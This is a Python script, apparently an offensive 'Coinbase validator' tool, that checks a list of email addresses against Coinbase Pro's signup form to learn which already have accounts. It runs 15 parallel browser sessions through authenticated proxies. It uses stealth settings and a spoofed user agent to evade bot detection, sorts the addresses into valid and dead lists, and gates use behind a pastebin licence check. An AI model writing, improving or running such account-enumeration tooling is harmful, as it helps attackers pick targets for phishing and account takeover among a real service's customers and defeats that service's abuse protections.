import sys, os, zipfile, requests
import concurrent.futures
import proxy
from pyvirtualdisplay import Display
from colorama import Fore
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium_stealth import stealth
from dotenv import load_dotenv
import chromedriver_binary

display = Display(visible=0, size=(800, 600))
display.start()

cb = '''      
         ) (       )              (        
   (  ( /( )\ ) ( /(   (    (     )\ )     
   )\ )\()|()/( )\())( )\   )\   (()/((    
 (((_|(_)\ /(_)|(_)\ )((_|(((_)(  /(_))\   
 )\___ ((_|_))  _((_|(_)_ )\ _ )\(_))((_)  
((/ __/ _ \_ _|| \| || _ )(_)_\(_) __| __| 
 | (_| (_) | | | .` || _ \ / _ \ \__ \ _|  
  \___\___/___||_|\_||___//_/ \_\|___/___| 
                                           
                VALIDATOR CLI                    
'''

print(f'{Fore.LIGHTMAGENTA_EX}{cb}{Fore.RESET}')
print('===========================================\n')

emailist = []

mailist = open(input("Input Your List: "))
lime = mailist.read().splitlines()
tot = len(lime)
for line in lime:
    emailist.append(line)

print(f'{Fore.LIGHTWHITE_EX}>{Fore.LIGHTGREEN_EX} Total List = {Fore.LIGHTWHITE_EX}{tot}{Fore.RESET}\n')

def proxies(username, password, endpoint, port):
    manifest_json = """
    {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Proxies",
        "permissions": [
            "proxy",
            "tabs",
            "unlimitedStorage",
            "storage",
            "<all_urls>",
            "webRequest",
            "webRequestBlocking"
        ],
        "background": {
            "scripts": ["background.js"]
        },
        "minimum_chrome_version":"22.0.0"
    }
    """

    background_js = """
    var config = {
            mode: "fixed_servers",
            rules: {
              singleProxy: {
                scheme: "https",
                host: "%s",
                port: parseInt(%s)
              },
              bypassList: ["localhost"]
            }
          };

    chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

    function callbackFn(details) {
        return {
            authCredentials: {
                username: "%s",
                password: "%s"
            }
        };
    }

    chrome.webRequest.onAuthRequired.addListener(
                callbackFn,
                {urls: ["<all_urls>"]},
                ['blocking']
    );
    """ % (endpoint, port, username, password)

    extension = 'proxies_extension.zip'

    with zipfile.ZipFile(extension, 'w') as zp:
        zp.writestr("manifest.json", manifest_json)
        zp.writestr("background.js", background_js)

    return extension

def sele(email):
    try:
        load_dotenv()
        api = os.getenv('api')
        apikey = requests.get('https://pastebin.com/raw/AMPAaJUm').text
        if api in apikey:
            username = proxy.username
            password = proxy.password
            endpoint = proxy.host
            port = proxy.port
            opt = webdriver.ChromeOptions()
            proxies_extension = proxies(username, password, endpoint, port)
            opt.add_experimental_option("excludeSwitches", ["enable-automation"])
            opt.add_experimental_option('useAutomationExtension', False)
            opt.add_extension(proxies_extension)
            opt.add_argument("--no-sandbox")
            opt.add_argument('ignore-certificate-errors')
            opt.add_argument('--disable-gpu')
            opt.add_argument('--no-sandbox')
            opt.add_argument("--disable-dev-shm-usage")
            opt.add_argument('--ignore-certificate-errors-spki-list')
            opt.add_argument('--disable-notifications')
            opt.add_argument('--disable-setuid-sandbox')
            opt.add_argument("--disable-dev-shm-usage")
            opt.add_argument("--disable-cookie-encryption")
            opt.add_argument("--disable-blink-features=AutomationControlled")
            opt.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")    
            driver = webdriver.Chrome(options=opt)
            stealth(driver,
                languages=["en-US", "en"],
                vendor="Google Inc.",
                platform="Win32",
                webgl_vendor="Intel Inc.",
                renderer="Intel Iris OpenGL Engine",
                fix_hairline=True,
            )
            try:
                driver.set_page_load_timeout(150)
                driver.get("https://pro.coinbase.com/signup/idv_required")
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "user_first_name")))
                driver.find_element(By.ID, "user_first_name").send_keys("Jhon")
                driver.find_element(By.ID, "user_last_name").send_keys("Kennedy")
                driver.find_element(By.ID, "user_email").click()
                driver.find_element(By.ID, "user_email").send_keys(email)
                driver.find_element(By.ID, "user_accepted_user_agreement").click()   
                driver.find_element(By.ID, "user_password").send_keys("KTyBvwhd783&@#")
                driver.find_element(By.NAME, "commit").click()
                try:
                    element = driver.find_element(By.CSS_SELECTOR, ".flash")
                    text = element.get_attribute('innerText')
                    if "An account already exists with this email address." in text:
                        tx = open('valid.txt', 'a+')
                        tx.write('\n')
                        tx.writelines(email)
                        tx.close()  
                        print(f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {email} {Fore.LIGHTWHITE_EX}={Fore.LIGHTCYAN_EX} Valid')
                        driver.quit()
                except NoSuchElementException:
                    tx = open('die.txt', 'a+')
                    tx.write('\n')
                    tx.writelines(email)
                    tx.close()  
                    print(f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {email} {Fore.LIGHTWHITE_EX}={Fore.LIGHTRED_EX} Die')
                    driver.quit()
            except TimeoutException:
                tx = open('proxy.txt', 'a+')
                tx.write('\n')
                tx.writelines(email)
                tx.close()  
                print(f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {email} {Fore.LIGHTWHITE_EX}={Fore.LIGHTYELLOW_EX} Bad Proxy')
                driver.quit()
        else:
            print(f'{Fore.LIGHTWHITE_EX}Your api key has expired.')
            sys.exit()
    except:
        sys.exit()


with concurrent.futures.ProcessPoolExecutor(max_workers=15) as executor:
    executor.map(sele, emailist)
